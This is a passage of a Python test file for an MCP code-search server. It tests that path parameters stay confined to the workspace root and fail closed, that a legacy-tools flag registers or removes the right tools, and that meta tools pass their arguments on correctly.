# an array<string> param at all).
_PLURAL_RATCHET_BASE_KWARGS: dict[str, dict[str, object]] = {
    "tg_query": {"action": "text", "pattern": "x", "path": "."},
}


def _tool_array_string_param_names(tool) -> list[str]:
    """Every param name in `tool`'s live input schema typed as an array of strings
    (`list[str]` or `list[str] | None`)."""
    properties = tool.inputSchema.get("properties", {})
    names = []
    for param_name, schema in properties.items():
        candidates = [schema, *schema.get("anyOf", ())]
        for candidate in candidates:
            if (
                candidate.get("type") == "array"
                and candidate.get("items", {}).get("type") == "string"
            ):
                names.append(param_name)
                break
    return names


def _enumerate_plural_confinement_ratchet_cases() -> list[tuple[str, str]]:
    """(tool_name, param_name) for every non-exempt array<string> param on every registered
    tool."""
    from tensor_grep.cli import mcp_server

    cases: list[tuple[str, str]] = []
    for tool in asyncio.run(mcp_server.mcp.list_tools()):
        for param_name in _tool_array_string_param_names(tool):
            if param_name in PLURAL_CONFINEMENT_EXEMPT:
                continue
            cases.append((tool.name, param_name))
    return sorted(cases)


_PLURAL_CONFINEMENT_RATCHET_CASES = _enumerate_plural_confinement_ratchet_cases()


def test_plural_confinement_exempt_allowlist_has_no_unused_entries():
    """Mirrors test_confinement_exempt_allowlist_has_no_unused_entries for the plural
    allowlist -- every PLURAL_CONFINEMENT_EXEMPT entry must correspond to a real array<string>
    param somewhere in the live schema."""
    from tensor_grep.cli import mcp_server

    all_array_param_names: set[str] = set()
    for tool in asyncio.run(mcp_server.mcp.list_tools()):
        all_array_param_names.update(_tool_array_string_param_names(tool))

    stale = set(PLURAL_CONFINEMENT_EXEMPT) - all_array_param_names
    assert not stale, f"PLURAL_CONFINEMENT_EXEMPT has stale/unused entries: {sorted(stale)}"


def test_plural_confinement_ratchet_has_at_least_one_live_case():
    """Guard against the ratchet silently enumerating zero cases (a schema change that
    renamed/removed workspace_roots would otherwise make this whole ratchet a no-op)."""
    assert ("tg_query", "workspace_roots") in _PLURAL_CONFINEMENT_RATCHET_CASES


@pytest.mark.parametrize(
    "tool_name,param_name",
    _PLURAL_CONFINEMENT_RATCHET_CASES,
    ids=[f"{t}.{p}" for t, p in _PLURAL_CONFINEMENT_RATCHET_CASES],
)
def test_mcp_plural_path_confinement_ratchet(
    tool_name, param_name, tmp_path, tmp_path_factory, monkeypatch
):
    """Every non-exempt array<string> path param on every registered MCP tool must: (a)
    refuse the WHOLE call, fail-closed, if ANY element escapes the confinement root -- never
    silently drop the bad element and proceed with the rest; (b) accept a list of entirely
    in-root elements.

    Schema-driven (mcp.list_tools()), like ratchet A -- a NEW array<string> param on any tool
    fails here until it is consciously confined (per-element) and added to
    _PLURAL_RATCHET_BASE_KWARGS, or exempted in PLURAL_CONFINEMENT_EXEMPT with a reason.
    """
    monkeypatch.delenv("TG_MCP_ROOT", raising=False)
    monkeypatch.chdir(tmp_path)
    assert tool_name in _PLURAL_RATCHET_BASE_KWARGS, (
        f"{tool_name} has a non-exempt array<string> param {param_name!r} this ratchet does "
        "not know how to reach. Either confine each element (via _confine_mcp_path) and add "
        "a _PLURAL_RATCHET_BASE_KWARGS entry, or add it to PLURAL_CONFINEMENT_EXEMPT with a "
        "reason if it is genuinely not a path list."
    )
    base_kwargs = dict(_PLURAL_RATCHET_BASE_KWARGS[tool_name])

    outside_dir = tmp_path_factory.mktemp("plural_ratchet_outside")
    in_root_dir = tmp_path / "plural_ratchet_inroot"
    in_root_dir.mkdir()

    # --- negative: ONE escaping element among otherwise-good elements must refuse the WHOLE
    # call, not silently drop the bad element and return partial/best-effort results for the
    # rest.
    rejected = _call_mcp_tool_text(
        tool_name, {**base_kwargs, param_name: [str(in_root_dir), str(outside_dir)]}
    )
    assert "must stay within" in rejected, (
        f"{tool_name}.{param_name} accepted a list containing an out-of-root element without "
        f"rejecting the WHOLE call (response: {rejected[:500]!r})."
    )
    try:
        rejected_payload = json.loads(rejected)
    except json.JSONDecodeError:
        rejected_payload = None
    if isinstance(rejected_payload, dict):
        assert "results_by_root" not in rejected_payload, (
            f"{tool_name}.{param_name} returned PARTIAL results_by_root alongside a "
            "confinement rejection -- the whole call must fail closed, never best-effort."
        )
        if isinstance(rejected_payload.get("error"), dict):
            assert rejected_payload["error"].get("code") == "invalid_input"

    # --- positive: an all-in-root list must not trip the confinement check.
    accepted = _call_mcp_tool_text(tool_name, {**base_kwargs, param_name: [str(in_root_dir)]})
    assert "must stay within" not in accepted, (
        f"{tool_name}.{param_name} rejected an all-in-root list as if an element were "
        f"out-of-root (response: {accepted[:500]!r}); the confinement anchor is probably wrong."
    )


# ------------------------------------------------------------------------------------------
# Flag-OFF invariant, via SUBPROCESS isolation (#98 must-fix 2).
#
# Registration (`_register_legacy_tool`) and `_MCP_TOOL_CAPABILITIES`
# (`_build_mcp_tool_capabilities`) are BOTH bound to `_legacy_tools_enabled()` at IMPORT time
# (module load). `importlib.reload(mcp_server)` in the SAME test process would re-run that
# import-time binding under the reloaded flag state, but the reload also REPLACES the module
# object every other already-imported reference points at -- leaking the flag-OFF registry
# into sibling call-time schema gates (the ratchet tests above, test_harness_api_docs.py) that
# run later in the same pytest session against what they still think is the flag-ON module.
# There is no reload precedent to reuse in this file; a subprocess is a clean process boundary
# instead: nothing the child process imports or mutates can leak back into this test process.
# ------------------------------------------------------------------------------------------

_MCP_FLAG_PROBE_SCRIPT = """
import asyncio
import json

from tensor_grep.cli import mcp_server

tool_names = sorted(t.name for t in asyncio.run(mcp_server.mcp.list_tools()))
capability_names = sorted(mcp_server._MCP_TOOL_CAPABILITIES)
print(json.dumps({
    "tool_names": tool_names,
    "capability_names": capability_names,
    "legacy_enabled": mcp_server._legacy_tools_enabled(),
}))
"""

_EXPECTED_META_TOOL_NAMES = {
    "tg_navigate",
    "tg_impact",
    "tg_query",
    "tg_context",
    "tg_explore",
    "tg_session",
    "tg_scan",
    "tg_audit",
    "tg_checkpoint",
    "tg_rewrite",
}
_EXPECTED_SINGLETON_TOOL_NAMES = {"tg_mcp_capabilities", "tg_classify_logs"}


def _run_mcp_flag_probe_subprocess(env_overrides: dict[str, str]) -> dict[str, object]:
    repo_root = Path(__file__).resolve().parents[2]
    src_dir = repo_root / "src"
    env = os.environ.copy()
    env.update(env_overrides)
    existing_pythonpath = env.get("PYTHONPATH")
    env["PYTHONPATH"] = (
        f"{src_dir}{os.pathsep}{existing_pythonpath}" if existing_pythonpath else str(src_dir)
    )
    completed = subprocess.run(
        [sys.executable, "-c", _MCP_FLAG_PROBE_SCRIPT],
        env=env,
        cwd=str(repo_root),
        capture_output=True,
        text=True,
        timeout=90,
    )
    assert completed.returncode == 0, (
        f"probe subprocess failed (exit {completed.returncode}):\n"
        f"stdout={completed.stdout!r}\nstderr={completed.stderr!r}"
    )
    # The probe script prints exactly one JSON line; be defensive about any stray warning
    # lines a dependency might emit on stdout ahead of it.
    return json.loads(completed.stdout.strip().splitlines()[-1])


def test_mcp_legacy_tools_flag_on_by_default_subprocess():
    """Baseline (flag unset -> treated as "" -> ON): all 58 tools register, and the
    capability registry stays exactly in lockstep with the live registry -- the SAME
    self-consistency test_tg_mcp_capabilities_registry_covers_public_tools already proves for
    the (only) flag state that test can run in-process, re-proven here via the identical
    subprocess mechanism the flag-OFF case below needs, for a true apples-to-apples check."""
    result = _run_mcp_flag_probe_subprocess({"TG_MCP_LEGACY_TOOLS": ""})
    assert result["legacy_enabled"] is True
    assert result["tool_names"] == result["capability_names"]
    assert len(result["tool_names"]) == 58
    assert _EXPECTED_META_TOOL_NAMES <= set(result["tool_names"])
    assert _EXPECTED_SINGLETON_TOOL_NAMES <= set(result["tool_names"])
    assert "tg_symbol_defs" in result["tool_names"]
    assert "tg_search" in result["tool_names"]


@pytest.mark.parametrize("off_value", ["0", "false", "no", "off", "OFF", "False", "  off  "])
def test_mcp_legacy_tools_flag_off_deregisters_legacy_tools_subprocess(off_value):
    """#98 must-fix 2: TG_MCP_LEGACY_TOOLS set to a recognized off-token de-registers all 46
    legacy tool names, leaving EXACTLY the 10 meta tools + the 2 always-on singletons (12
    total) -- and the capability registry stays in lockstep with the live registry in this
    flag state too, not just the flag-ON state the in-process invariant test covers."""
    result = _run_mcp_flag_probe_subprocess({"TG_MCP_LEGACY_TOOLS": off_value})
    assert result["legacy_enabled"] is False
    assert result["tool_names"] == result["capability_names"]
    assert len(result["tool_names"]) == 12
    assert set(result["tool_names"]) == _EXPECTED_META_TOOL_NAMES | _EXPECTED_SINGLETON_TOOL_NAMES
    # every one of the 46 legacy names must be fully gone from BOTH the live registry and the
    # capability map -- spot-check a representative handful across families.
    for legacy_name in (
        "tg_symbol_defs",
        "tg_search",
        "tg_ast_search",
        "tg_find",
        "tg_index_search",
        "tg_session_open",
        "tg_ruleset_scan",
        "tg_rulesets",
        "tg_audit_manifest_verify",
        "tg_checkpoint_create",
        "tg_rewrite_plan",
        "tg_rewrite_diff",
    ):
        assert legacy_name not in result["tool_names"]
        assert legacy_name not in result["capability_names"]


@pytest.mark.parametrize("on_value", ["1", "true", "yes", "on", "anything-else", "0x"])
def test_mcp_legacy_tools_flag_on_recognizes_only_specific_off_tokens_subprocess(on_value):
    """Only the 4 recognized off-tokens (0/false/no/off, case/whitespace-insensitive) turn the
    flag OFF -- every other value, including a nonsense string, keeps the default-ON additive
    behavior (fail-open toward the additive, non-breaking posture)."""
    result = _run_mcp_flag_probe_subprocess({"TG_MCP_LEGACY_TOOLS": on_value})
    assert result["legacy_enabled"] is True
    assert len(result["tool_names"]) == 58


@pytest.mark.parametrize(
    "value,expected",
    [
        ("0", False),
        ("false", False),
        ("False", False),
        ("FALSE", False),
        ("no", False),
        ("No", False),
        ("off", False),
        ("Off", False),
        ("OFF", False),
        ("  off  ", False),
        ("1", True),
        ("true", True),
        ("yes", True),
        ("on", True),
        ("", True),
        ("anything-else", True),
        ("  ", True),
    ],
)
def test_legacy_tools_enabled_recognizes_off_tokens(monkeypatch, value, expected):
    """Fast, in-process unit coverage of `_legacy_tools_enabled`'s own parsing logic --
    complements the slower subprocess tests above, which prove the import-time WIRING
    (registration + capability registry) actually respects this function's result."""
    from tensor_grep.cli import mcp_server

    monkeypatch.setenv("TG_MCP_LEGACY_TOOLS", value)
    assert mcp_server._legacy_tools_enabled() is expected


def test_legacy_tools_enabled_defaults_on_when_unset(monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.delenv("TG_MCP_LEGACY_TOOLS", raising=False)
    assert mcp_server._legacy_tools_enabled() is True


def test_register_legacy_tool_returns_fn_unchanged_when_flag_off(monkeypatch):
    """`_register_legacy_tool` must return `fn` completely unwrapped (not merely
    functionally equivalent) when the flag is OFF, so a meta-tool's dispatch body can keep
    calling it directly -- verified via identity, not just behavior."""
    from tensor_grep.cli import mcp_server

    monkeypatch.setenv("TG_MCP_LEGACY_TOOLS", "0")

    def _sample() -> str:
        return "sentinel"

    result = mcp_server._register_legacy_tool(_sample)
    assert result is _sample


def test_register_legacy_tool_registers_via_mcp_tool_when_flag_on(monkeypatch):
    """Proves `_register_legacy_tool` calls `mcp.tool()(fn)` when the flag is ON, WITHOUT
    actually mutating the real shared `mcp` singleton's tool registry -- registering a real
    extra tool there would leak into every other test in this file that enumerates
    `mcp.list_tools()` (including the harness_api.md doc-parity governance test), since the
    FastMCP tool table has no per-test reset hook. Spy on `mcp.tool` itself instead."""
    from tensor_grep.cli import mcp_server

    monkeypatch.delenv("TG_MCP_LEGACY_TOOLS", raising=False)
    decorator_spy = MagicMock(side_effect=lambda fn: fn)
    tool_factory_spy = MagicMock(return_value=decorator_spy)
    monkeypatch.setattr(mcp_server.mcp, "tool", tool_factory_spy)

    def _sample() -> str:
        return "sentinel"

    result = mcp_server._register_legacy_tool(_sample)

    tool_factory_spy.assert_called_once_with()
    decorator_spy.assert_called_once_with(_sample)
    assert result is _sample


# ------------------------------------------------------------------------------------------
# Per-meta dispatch tests (#98): monkeypatch-spy the composed LEGACY function, call the
# META tool, and assert (a) the spy was called with the expected forwarded kwargs and (b)
# the meta tool's return value IS the spy's return value (pure pass-through, no
# re-wrapping). Proves the dispatch WIRING, not just "it doesn't crash".
# ------------------------------------------------------------------------------------------


def test_tg_navigate_dispatches_defs(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="DEFS_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_symbol_defs", spy)

    result = mcp_server.tg_navigate(
        action="defs", symbol="Foo", path=".", provider="lsp", max_repo_files=42
    )

    assert result == "DEFS_SENTINEL"
    spy.assert_called_once_with(
        symbol="Foo", path=str(tmp_path.resolve()), provider="lsp", max_repo_files=42
    )


def test_tg_navigate_dispatches_source(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="SOURCE_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_symbol_source", spy)

    result = mcp_server.tg_navigate(action="source", symbol="Foo")
    assert result == "SOURCE_SENTINEL"
    spy.assert_called_once()


def test_tg_navigate_dispatches_refs_forwarding_deadline(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="REFS_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_symbol_refs", spy)

    result = mcp_server.tg_navigate(action="refs", symbol="Foo", deadline=12.5)
    assert result == "REFS_SENTINEL"
    assert spy.call_args.kwargs["deadline"] == 12.5


def test_tg_navigate_dispatches_callers_forwarding_deadline(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="CALLERS_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_symbol_callers", spy)

    result = mcp_server.tg_navigate(action="callers", symbol="Foo", deadline=3.0)
    assert result == "CALLERS_SENTINEL"
    assert spy.call_args.kwargs["deadline"] == 3.0


def test_tg_navigate_dispatches_imports_with_confined_file(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    (tmp_path / "src").mkdir()
    spy = MagicMock(return_value="IMPORTS_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_file_imports", spy)

    result = mcp_server.tg_navigate(action="imports", file="src/foo.py")
    assert result == "IMPORTS_SENTINEL"
    spy.assert_called_once_with(file=str((tmp_path / "src" / "foo.py").resolve()))


def test_tg_navigate_dispatches_importers(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="IMPORTERS_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_file_importers", spy)

    result = mcp_server.tg_navigate(action="importers", file="foo.py", deadline=5.0)
    assert result == "IMPORTERS_SENTINEL"
    kwargs = spy.call_args.kwargs
    assert kwargs["file"] == str((tmp_path / "foo.py").resolve())
    assert kwargs["deadline"] == 5.0


def test_tg_navigate_unknown_action():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_navigate(action="bogus", symbol="Foo"))
    assert payload["error"]["code"] == "invalid_input"
    assert "bogus" in payload["error"]["message"]


@pytest.mark.parametrize("action", ["defs", "source", "refs", "callers"])
def test_tg_navigate_missing_symbol(action):
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_navigate(action=action))
    assert payload["error"]["code"] == "invalid_input"
    assert "symbol" in payload["error"]["message"]


@pytest.mark.parametrize("action", ["imports", "importers"])
def test_tg_navigate_missing_file(action):
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_navigate(action=action))
    assert payload["error"]["code"] == "invalid_input"
    assert "file" in payload["error"]["message"]


def test_tg_impact_dispatches_impact(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="IMPACT_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_symbol_impact", spy)

    result = mcp_server.tg_impact(action="impact", symbol="Foo", deadline=1.0)
    assert result == "IMPACT_SENTINEL"
    assert spy.call_args.kwargs["symbol"] == "Foo"
    assert spy.call_args.kwargs["deadline"] == 1.0


def test_tg_impact_dispatches_blast_radius(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="BR_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_symbol_blast_radius", spy)

    result = mcp_server.tg_impact(action="blast_radius", symbol="Foo", max_depth=7)
    assert result == "BR_SENTINEL"
    assert spy.call_args.kwargs["max_depth"] == 7


def test_tg_impact_dispatches_blast_radius_plan(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="BRP_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_symbol_blast_radius_plan", spy)

    result = mcp_server.tg_impact(action="blast_radius_plan", symbol="Foo", max_symbols=9)
    assert result == "BRP_SENTINEL"
    assert spy.call_args.kwargs["max_symbols"] == 9


def test_tg_impact_dispatches_blast_radius_render(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="BRR_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_symbol_blast_radius_render", spy)

    result = mcp_server.tg_impact(
        action="blast_radius_render", symbol="Foo", render_profile="compact"
    )
    assert result == "BRR_SENTINEL"
    assert spy.call_args.kwargs["render_profile"] == "compact"


def test_tg_impact_missing_symbol():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_impact(action="impact"))
    assert payload["error"]["code"] == "invalid_input"
    assert "symbol" in payload["error"]["message"]


def test_tg_impact_unknown_action():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_impact(action="bogus", symbol="Foo"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_query_dispatches_text_with_pattern(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="TEXT_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_search", spy)

    result = mcp_server.tg_query(action="text", pattern="foo", rank=True)
    assert result == "TEXT_SENTINEL"
    assert spy.call_args.kwargs["pattern"] == "foo"
    assert spy.call_args.kwargs["rank"] is True


def test_tg_query_text_query_aliases_pattern(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="TEXT_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_search", spy)

    mcp_server.tg_query(action="text", query="bar")
    assert spy.call_args.kwargs["pattern"] == "bar"


def test_tg_query_dispatches_ast(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="AST_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_ast_search", spy)

    result = mcp_server.tg_query(action="ast", pattern="$X", lang="python")
    assert result == "AST_SENTINEL"
    assert spy.call_args.kwargs["lang"] == "python"


def test_tg_query_ast_missing_lang():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_query(action="ast", pattern="$X"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_query_dispatches_find_substitutes_default_max_tokens(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="FIND_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_find", spy)

    result = mcp_server.tg_query(action="find", query="what does this do")
    assert result == "FIND_SENTINEL"
    assert spy.call_args.kwargs["max_tokens"] == mcp_server._DEFAULT_MCP_FIND_MAX_TOKENS
    assert spy.call_args.kwargs["query"] == "what does this do"


def test_tg_query_dispatches_find_forwards_explicit_max_tokens(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="FIND_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_find", spy)

    mcp_server.tg_query(action="find", query="x", max_tokens=0)
    assert spy.call_args.kwargs["max_tokens"] == 0


def test_tg_query_find_pattern_aliases_query(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="FIND_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_find", spy)

    mcp_server.tg_query(action="find", pattern="fallback query")
    assert spy.call_args.kwargs["query"] == "fallback query"


def test_tg_query_dispatches_index(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="INDEX_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_index_search", spy)

    result = mcp_server.tg_query(action="index", pattern="foo")
    assert result == "INDEX_SENTINEL"
    spy.assert_called_once()


def test_tg_query_index_missing_pattern():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_query(action="index"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_query_workspace_roots_dispatches_once_per_root(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    root_a = tmp_path / "root_a"
    root_b = tmp_path / "root_b"
    root_a.mkdir()
    root_b.mkdir()
    spy = MagicMock(side_effect=lambda **kwargs: json.dumps({"path": kwargs["path"]}))
    monkeypatch.setattr(mcp_server, "tg_search", spy)

    out = mcp_server.tg_query(action="text", pattern="foo", workspace_roots=["root_a", "root_b"])
    payload = json.loads(out)

    assert spy.call_count == 2
    called_paths = {call.kwargs["path"] for call in spy.call_args_list}
    assert called_paths == {str(root_a.resolve()), str(root_b.resolve())}
    assert set(payload["results_by_root"]) == called_paths
    assert (
        payload["workspace_roots"] == sorted(called_paths)
        or set(payload["workspace_roots"]) == called_paths
    )


def test_tg_query_workspace_roots_one_bad_element_fails_whole_call(
    monkeypatch, tmp_path, tmp_path_factory
):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    good_root = tmp_path / "good_root"
    good_root.mkdir()
    outside_root = tmp_path_factory.mktemp("outside")
    spy = MagicMock(return_value="{}")
    monkeypatch.setattr(mcp_server, "tg_search", spy)

    out = mcp_server.tg_query(
        action="text", pattern="foo", workspace_roots=["good_root", str(outside_root)]
    )
    payload = json.loads(out)

    assert payload["error"]["code"] == "invalid_input"
    assert "results_by_root" not in payload
    spy.assert_not_called()  # fail-closed BEFORE any root is queried


def test_tg_query_unknown_action():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_query(action="bogus"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_context_dispatches_pack_omits_max_tokens_when_none(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="PACK_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_context_pack", spy)

    result = mcp_server.tg_context(action="pack", query="x")
    assert result == "PACK_SENTINEL"
    assert "max_tokens" not in spy.call_args.kwargs


def test_tg_context_dispatches_pack_forwards_explicit_max_tokens(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="PACK_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_context_pack", spy)

    mcp_server.tg_context(action="pack", query="x", max_tokens=0)
    assert spy.call_args.kwargs["max_tokens"] == 0


def test_tg_context_dispatches_edit_plan(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="EDIT_PLAN_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_edit_plan", spy)

    result = mcp_server.tg_context(action="edit_plan", query="x", max_symbols=11)
    assert result == "EDIT_PLAN_SENTINEL"
    assert spy.call_args.kwargs["max_symbols"] == 11
    # tg_edit_plan's OWN default for max_tokens is already None -- direct forwarding, no
    # ambiguity, so it IS present in the call (unlike pack/render/capsule above).
    assert spy.call_args.kwargs["max_tokens"] is None


def test_tg_context_dispatches_render(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="RENDER_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_context_render", spy)

    result = mcp_server.tg_context(action="render", query="x", render_profile="llm")
    assert result == "RENDER_SENTINEL"
    assert spy.call_args.kwargs["render_profile"] == "llm"
    assert "max_tokens" not in spy.call_args.kwargs


def test_tg_context_dispatches_capsule_forwards_deadline(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="CAPSULE_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_agent_capsule", spy)

    result = mcp_server.tg_context(action="capsule", query="x", deadline=9.5)
    assert result == "CAPSULE_SENTINEL"
    assert spy.call_args.kwargs["deadline"] == 9.5
    assert "max_tokens" not in spy.call_args.kwargs


def test_tg_context_missing_query():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_context(action="pack"))
    assert payload["error"]["code"] == "invalid_input"
    assert "query" in payload["error"]["message"]


def test_tg_context_unknown_action():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_context(action="bogus", query="x"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_explore_dispatches_orient_forwarding_ignore(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="ORIENT_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_orient", spy)

    result = mcp_server.tg_explore(action="orient", ignore=["vendor/**"])
    assert result == "ORIENT_SENTINEL"
    assert spy.call_args.kwargs["ignore"] == ["vendor/**"]


def test_tg_explore_dispatches_repo_map(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="REPO_MAP_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_repo_map", spy)

    result = mcp_server.tg_explore(action="repo_map", max_repo_files=500)
    assert result == "REPO_MAP_SENTINEL"
    assert spy.call_args.kwargs["max_repo_files"] == 500


def test_tg_explore_dispatches_doctor(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="DOCTOR_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_doctor", spy)

    result = mcp_server.tg_explore(action="doctor", with_lsp=False)
    assert result == "DOCTOR_SENTINEL"
    assert spy.call_args.kwargs["with_lsp"] is False


def test_tg_explore_dispatches_devices(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="DEVICES_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_devices", spy)

    result = mcp_server.tg_explore(action="devices", json_output=False)
    assert result == "DEVICES_SENTINEL"
    assert spy.call_args.kwargs["json_output"] is False


def test_tg_explore_unknown_action():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_explore(action="bogus"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_session_dispatches_open(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="OPEN_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_session_open", spy)

    result = mcp_server.tg_session(action="open", max_repo_files=77)
    assert result == "OPEN_SENTINEL"
    assert spy.call_args.kwargs["max_repo_files"] == 77


def test_tg_session_dispatches_list(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="LIST_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_session_list", spy)

    assert mcp_server.tg_session(action="list") == "LIST_SENTINEL"


def test_tg_session_show_missing_session_id():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_session(action="show"))
    assert payload["error"]["code"] == "invalid_input"
    assert "session_id" in payload["error"]["message"]


def test_tg_session_dispatches_show(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="SHOW_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_session_show", spy)

    result = mcp_server.tg_session(action="show", session_id="sess-1")
    assert result == "SHOW_SENTINEL"
    assert spy.call_args.kwargs["session_id"] == "sess-1"


def test_tg_session_dispatches_refresh(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="REFRESH_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_session_refresh", spy)

    result = mcp_server.tg_session(action="refresh", session_id="sess-1")
    assert result == "REFRESH_SENTINEL"


def test_tg_session_dispatches_context_omits_max_tokens_when_none(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="CONTEXT_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_session_context", spy)

    result = mcp_server.tg_session(action="context", session_id="sess-1", query="x")
    assert result == "CONTEXT_SENTINEL"
    assert "max_tokens" not in spy.call_args.kwargs


def test_tg_session_context_missing_query():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_session(action="context", session_id="sess-1"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_session_dispatches_edit_plan(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="EDIT_PLAN_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_session_edit_plan", spy)

    result = mcp_server.tg_session(
        action="edit_plan", session_id="sess-1", query="x", max_symbols=4
    )
    assert result == "EDIT_PLAN_SENTINEL"
